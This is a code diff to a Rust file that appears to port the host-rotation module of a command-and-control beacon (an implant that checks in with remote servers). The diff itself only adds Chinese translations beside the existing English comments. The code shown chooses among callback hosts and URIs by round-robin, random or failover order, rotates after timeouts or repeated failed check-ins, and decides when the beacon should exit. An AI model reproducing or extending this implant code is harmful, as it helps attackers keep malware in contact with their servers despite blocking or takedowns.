@@ -1,3 +1,4 @@
+//! 主机/域名轮换策略（strategy.cpp）。
 //! Host/domain rotation strategy (strategy.cpp).
 
 use crate::beacon::{HOST_STRATEGY_EVENT, HOST_STRATEGY_RANDOM, SETTING_MAX_RETRY_STRATEGY_ATTEMPTS, SETTING_MAX_RETRY_STRATEGY_DURATION, SETTING_MAX_RETRY_STRATEGY_INCREASE};
@@ -6,12 +7,16 @@ use parking_lot::Mutex;
 
 #[derive(Clone, Copy, Debug)]
 pub struct StrategyInfo {
+    /// 0 = 轮询（round-robin），1 = 随机（random），2 = 基于事件（event based）。
     /// 0 = round-robin, 1 = random, 2 = event based.
     pub strategy: i32,
+    /// 主机轮换前等待的秒数。-1 禁用，0 表示每次回连都轮换。
     /// Seconds before host rotation. -1 disabled, 0 rotate every checkin.
     pub rotation_timer: i32,
+    /// 连续失败多少秒后轮换。-1 禁用。
     /// Seconds of consecutive failure before rotation. -1 disabled.
     pub failover_timer: i32,
+    /// 轮换前允许的连续失败次数。-1 禁用。
     /// Consecutive failure count before rotation. -1 disabled.
     pub failover_maxfail: i32,
 }
@@ -29,7 +34,7 @@ pub fn strategy_setup(
     si.failover_maxfail = failover_maxfail;
 }
 
-// ---- state for the static-token implementations -------------------------
+// ---- 静态令牌实现的状态 ---- state for the static-token implementations -------------------------
 
 struct RoundRobin {
     token: Option<String>,
@@ -76,6 +81,7 @@ fn now_secs() -> i64 {
         .unwrap_or(0)
 }
 
+/// 轮询策略：hosts 形如 "host1,/uri,host2,/uri,..."。
 /// Round-robin: hosts is "host1,/uri,host2,/uri,..."
 fn next_host_round_robin(hosts: &[u8]) -> Option<Vec<u8>> {
     let mut rr = RR.lock();
@@ -86,7 +92,8 @@ fn next_host_round_robin(hosts: &[u8]) -> Option<Vec<u8>> {
                 rr.token = Some(hosts_str.clone());
                 let mut parts = hosts_str.split(',');
                 if let Some(first) = parts.next() {
-                    // remember the rest for the next call
+                    // 记住其余部分供下次调用使用。
+                    // Remember the rest for the next call.
                     let rest: Vec<String> = parts.map(|s| s.to_string()).collect();
                     let first = first.as_bytes().to_vec();
                     rr.token = Some(rest.join(","));
@@ -161,6 +168,7 @@ fn next_host_priority_failover(hosts: &[u8], last_checkin_failed: bool, si: &Str
     let max_fail_times = si.failover_maxfail;
     let max_fail_seconds = si.failover_timer;
 
+    // 首次调用？加载静态字段...
     // First pass? Load static fields...
     if p.hs.is_none() {
         p.hs = Some(hosts_str.clone());
@@ -172,6 +180,7 @@ fn next_host_priority_failover(hosts: &[u8], last_checkin_failed: bool, si: &Str
         p.uri_offset = 0;
     }
 
+    // 是否应前进到下一个 host/uri 对？
     // Should we advance to the next host/uri pair?
     if last_checkin_failed {
         if max_fail_times > -1 {
@@ -194,6 +203,7 @@ fn next_host_priority_failover(hosts: &[u8], last_checkin_failed: bool, si: &Str
         p.failed_count = 0;
     }
 
+    // 检查主机是否已「过期」（仅在获取主机时）。
     // Check for 'expired' host (only when getting the host)
     if max_time_seconds > -1 && !expired && p.uri_offset == 0 {
         if now > p.start_time + max_time_seconds as i64 {
@@ -201,6 +211,7 @@ fn next_host_priority_failover(hosts: &[u8], last_checkin_failed: bool, si: &Str
         }
     }
 
+    // 是否失败或过期？前进到下一个主机...
     // Are we failed or expired? Move to the next host...
     if expired {
         p.failed_count = 0;
@@ -213,12 +224,14 @@ fn next_host_priority_failover(hosts: &[u8], last_checkin_failed: bool, si: &Str
         p.start_time = now;
     }
 
+    // 是否正在获取主机名？
     // Are we getting the Host name?
     if p.uri_offset == 0 {
         p.uri_offset = 1;
         return Some(p.tokens[p.token_index as usize].as_bytes().to_vec());
     }
 
+    // URI 位于奇数索引。
     // URI at odd index
     p.uri_offset = 0;
     let idx = p.token_index + 1;
@@ -229,6 +242,7 @@ fn next_host_priority_failover(hosts: &[u8], last_checkin_failed: bool, si: &Str
     }
 }
 
+/// 获取下一个主机（或上一个主机的 URI）。成对调用。
 /// Get the next host (or the URI of the previous host). Called in pairs.
 pub fn next_host(hosts: &[u8], last_checkin_failed: bool, si: &StrategyInfo) -> Option<Vec<u8>> {
     if si.strategy == HOST_STRATEGY_RANDOM {
@@ -240,6 +254,8 @@ pub fn next_host(hosts: &[u8], last_checkin_failed: bool, si: &StrategyInfo) -> 
     }
 }
 
+/// 检查最大重试策略；达到阈值时调整休眠时间。
+/// 若信标应退出则返回 TRUE。
 /// Check the max retry strategy; adjust sleep time if threshold met.
 /// Returns TRUE if the beacon should exit.
 pub fn check_max_retry(
